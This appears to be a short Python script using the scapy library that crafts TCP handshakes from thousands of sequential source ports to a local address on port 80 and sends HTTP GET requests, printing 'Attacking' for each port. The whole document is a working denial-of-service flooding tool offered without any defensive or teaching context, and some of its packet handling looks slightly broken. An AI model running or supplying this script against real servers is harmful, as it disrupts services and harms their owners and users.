import scapy.all as scapy

target = "192.168.2.10"
sp = 3000
numgets = 5000

print("Attacking ", target, " with ", numgets, " GETs")
i = scapy.IP(dst = target)

for s in range(sp, sp+numgets-1):
    t = scapy.TCP(sport = s, dport = 80, flags = "S")
    pkt = scapy.sr1(i/t)
    t.seq = pkt.ack
    t.ack = pkt.seq + 1
    t.flags = "A"
    get = "GET / HTTP/1.1\r\nHost:" + target
    pkt = scapy.sr(i/t/get, verbose =0)
    print("Attacking form port",s)
print("Done!")